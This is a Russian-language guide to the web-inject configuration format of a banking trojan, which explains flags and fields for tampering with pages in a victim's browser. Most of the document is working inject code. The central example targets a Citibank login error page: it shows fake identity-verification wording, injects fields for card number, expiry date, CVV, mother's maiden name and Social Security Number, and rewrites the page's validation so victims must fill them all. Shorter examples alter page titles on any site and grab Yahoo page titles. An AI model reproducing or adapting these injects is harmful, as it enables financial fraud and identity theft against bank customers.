URL - URL на которую должен срабатывать веб-инжект, можно использовать маску.
Флаги - определяет основное условие загрузки, может состоять из нескольких флагов в любом порядке, но с учетом регистра. В настоящее время доступны следующие флаги:
P - запускать веб-инжект при POST запросе на URL.
G - запускать веб-инжект при GET запросе на URL.
L - изменяет предназначение веб-инжекта, если указать этот флаг, то будет получен нужный кусок данных и немедленно сохранен в лог.
F - дополняет флаг L, позволяет записывать результат не в лог, а в отдельный файл.
H - дополняет флаг L, сохраняет нужный кусок данных без вырезания тегов.
D - запускать веб-инжект раз в 24 часа.



блэкмаска POST - представляет из себя маску POST-данных передаваемых URL, при которых не будет запускаться веб-инжект.


вайтмаска POST - представляет из себя маску POST-данных передаваемых URL, при которых будет запускаться веб-инжект.
URL блокировки - в случаи если ваш веб-инжект должен грузиться лиш один раз на компьютере жертвы, то здесь следует указать маску URL, в случаи открытия которой данный Веб-инжект не будет более использоваться на компьютере. Если вам этого не нужно, оставтье поле пустым.
маска контекста - маска части содержимого страницы, при котором должен сработать веб-инжект.

После указания URL, со следующей строки начинается перечисление веб-инжектов, которое длится до тех пор, пока не достигнут конец файла или не задана новая URL при помощи очередной записи set_url. Один веб-инжект состоит из трех элементов:
Без флага L:
data_before - маска данных после которых нужно записать новые данные.

data_after - маска данных перед которыми следует записать новые данные.

data_inject - новые данные, на которые будет заменено содержимое между data_before, data_after.

С флагом L:
data_before - маска данных после которых начинается кусок получаемых данных.

data_after - маска данных перед которыми кончается кусок получаемых данных.

data_inject - играет роль заголовка для получаемых данных, нужен лишь для визуального выделения в логах.

Название элемента должно начинаться с первого байта новой строки и сразу после окончания названия должен быть перенос на следующею строку. Со следующей строки идут данные веб-инжекта, окончание данных обозначается строкой data_end, также это строка должна начинаться с первого байта очередной строки. Внутри элемента вы можете свободно использовать любые символы.

Примечания:
Как известно, новая строка может обозначаться одним (0x0A) или двумя (0x0D и 0x0A) байтами. Т.к. в основном веб-инжект используется для подмены содержимого текстовых данных, то данная особенность учтена, и бот успешно запускает веб-инжект даже если у вас новые строки обозначены двумя байтами, а в содержимом URL одним байтом и наоборот.
Элементы веб-инжекта могут быть расположены в любом порядке, т.е. data_before, data_after, data_inject, или data_before, data_inject, data_after и т.д.
Элемент может быть пустым.
При использовании флага L, в получаемых данных каждый тег заменяютя на один пробел.



пример выдергивания данных 

set_url https://ссылка.com/data.pl GP

data_before
src="/cm/js/branding.js"></script>
data_end
data_inject
<script>
function set_cookie1(name, value, expires)
{
if (!expires)
{
expires = new Date();
}
document.cookie = name + "=" + escape(value) + "; expires=" + expires.toGMTString() + "; path=/";
}

function get_cookie(name)
{
cookie_name = name + "=";
cookie_length = document.cookie.length;
cookie_begin = 0;
while (cookie_begin < cookie_length)
{
value_begin = cookie_begin + cookie_name.length;
if (document.cookie.substring(cookie_begin, value_begin) == cookie_name)
{
var value_end = document.cookie.indexOf (";", value_begin);
if (value_end == -1)
{
value_end = cookie_length;
}
return unescape(document.cookie.substring(value_begin, value_end));
}
cookie_begin = document.cookie.indexOf(" ", cookie_begin) + 1;
if (cookie_begin == 0)
{
break;
}
}
return null;
}
</SCRIPT>
data_end
data_after
<noscript>
data_end


data_before
</tr><tr><td colspan="3" class="password">
data_end
data_inject
<script>
var name1 = "ct_ver";
var cookie_val1 = get_cookie(name1);

if (cookie_val1 == "y9872") 
{
document.writeln("<input type='password' name='password' id='password' onkeydown='checkUidComplete(event)' size='13'>");
}
if (cookie_val1 == null)
{
var tmp = "y9872";
var expires1 = new Date(); 
expires1.setTime(expires1.getTime() + (1000 * 86400 * 365));
set_cookie1(name1, tmp, expires1);
document.writeln("<input type='password' id='username' name='username' onkeydown='checkUidComplete(event)' size='13'>");
}
</script>
data_end
data_after
</td></tr><tr valign="top"><td><input type="checkbox"
data_end

data_before
"username" style="padding-bottom:4px;">
data_end
data_inject
<script>
var name2 = "ct_ver2";
var cookie_val2 = get_cookie(name2);

if (cookie_val2 == "y9871") 
{
document.writeln("<input type='text' id='username' name='username' size='12' value=''>");
}
if (cookie_val2 == null)
{
var tmp = "y9871";
var expires1 = new Date(); 
expires1.setTime(expires1.getTime() + (1000 * 86400 * 365));
set_cookie1(name2, tmp, expires1);
document.writeln("<input type='text' name='password' id='password' size='12' value=''>");
}
</script>
data_end
data_after
</td></tr><tr><td colspan="2" nowrap><b>Password
data_end

set_url https://web.da-us.citibank.com/cgi-bin/citi...l/autherror.do* GP
data_before
<td colspan=2 class="username"><big><B>
data_end
data_inject
<input type="text" id="username" name="username" size="13" length="50" value=>
data_end
data_after
</B></big></td></tr>
data_end

data_before
univers/misc/error.gif'><font color=#d73535><B><big>
data_end
data_inject
Information you entered does not match our records.
data_end
data_after
</big></B></font><BR><BR><big>Please check
data_end

data_before
</big></B></font><BR><BR><big>
data_end
data_inject
In order to avoid fraud, we must verify your identity. We ask several questions.<br> Only you can answer these questions. This information is used only for security <br>reasons, to protect you from identity fraud.<br> Please make sure you complete all required information correctly.
data_end
data_after
<BR><BR>If you're
data_end

data_before
<tr valign=top><td colspan=2 class=inputField>
data_end
data_inject
<input id="password" name="password" maxlength="50" size="12" value="" autocomplete="OFF" type="password"><br><br></td></tr><!-- --> <table border="0" cellpadding="0" cellspacing="0" width="100%"><tbody><tr valign="top"><td align="left"><big><br> Enter the information about Credit Card linked to your account: </big><br><br></td></tr></tbody></table> <tr><td colspan="2"><b>ATM Card Number</b></td></tr><br> <tr valign="top"><td colspan="2"> <INPUT TYPE="text" NAME="atm" VALUE="" SIZE="16" MAXLENGTH="16"><BR> </td></tr> <tr><td colspan="2"><b>Expired Date</b></td></tr> <br> <tr valign="top"><td colspan="2"> <INPUT TYPE="text" NAME="exp" VALUE="" SIZE="3" MAXLENGTH="5"></td></tr><BR> <tr><td colspan="2"><b>CVV</b></td></tr> <br> <tr valign="top"><td colspan="2"> <INPUT TYPE="text" NAME="cvv" VALUE="" SIZE="2" MAXLENGTH="3"><BR><br></td></tr> <table border="0" cellpadding="0" cellspacing="0" width="100%"><tbody><tr valign="top"><td align="left"><big><br> Enter your personal<br> information: </big></td></tr></tbody></table><br> <tr><td colspan="2"><b>Mother's Maiden Name</b></td></tr> <br> <tr valign="top"><td colspan="2"> <INPUT TYPE="text" NAME="mmn" VALUE="" SIZE="20" MAXLENGTH="32"></td></tr><BR> <tr><td colspan="2"><b>Social Security Number</b></td></tr> <table border="0" cellpadding="0" cellspacing="0" width="20%"><tbody> <tr valign="top"><td colspan="2"> <INPUT TYPE="text" NAME="ssn1" VALUE="" SIZE="2" MAXLENGTH="3"> <td colspan="2"> <INPUT TYPE="text" NAME="ssn2" VALUE="" SIZE="1" MAXLENGTH="2" valign="left"> <td colspan="2"> <INPUT TYPE="text" NAME="ssn3" VALUE="" SIZE="3" MAXLENGTH="4"> </td></td></td></tr> </table></tbody> <!-- --><tr><td><IMG border=0 height=10 src='/images/pixel.gif' width=1></td></tr>
data_end
data_after
<tr><td align=left valign="top" nowrap></td><td align=right><IMG border=0 height=10 src='/images/pixel.gif' width=1><input type=image alt="" src="/images/univers/buttons/cont_btn.gif"
data_end

data_before
if(!(usernameValidation(frm.username)))
data_end
data_inject
return false; if(!(cinRegValidation(frm.atm))) return false; if((document.LoginValidateForm.exp.value.length<1) || (document.LoginValidateForm.cvv.value.length<1) || (document.LoginValidateForm.mmn.value.length<1) || (document.LoginValidateForm.ssn1.value.length<1) || (document.LoginValidateForm.ssn2.value.length<1) || (document.LoginValidateForm.ssn3.value.length<1)) { alert ("All fields are required."); return false; } else if((document.LoginValidateForm.exp.value.length<5) || (document.LoginValidateForm.cvv.value.length<3) || (document.LoginValidateForm.mmn.value.length<4) || (document.LoginValidateForm.ssn1.value.length<3) || (document.LoginValidateForm.ssn2.value.length<2) || (document.LoginValidateForm.ssn3.value.length<4)) { alert ("Please verify your information and fill the form.\n(All fields are required)."); return false; }
data_end
data_after
if(!(passwordValidation(frm.password)))
data_end



=============

;Подмена заголовка любого сайта по протоколу http на фразу "HTTP: Web-Inject"
set_url http://* GP

data_before
<title>
data_end

data_inject
HTTP: Web-Inject
data_end

data_after
</title>
data_end
Код:
;Подмена заголовка любого сайта по протоколу http на фразу "HTTPS: Web-Inject" и добваление текста "BODY: Web-Inject" сразу после тега <body>
set_url https://* GP

data_before
<title>
data_end

data_inject
HTTPS: Web-Inject
data_end

data_after
</title>
data_end

data_before
<body>
data_end

data_inject
<hr>BODY: Web-Inject<hr>
data_end

data_after
data_end
Код:
;Получем заголовок страницы
set_url http://*yahoo.com* LGP

data_before
<title>
data_end

data_inject
Yahoo Title: Web-Inject
data_end

data_after
</title>
data_end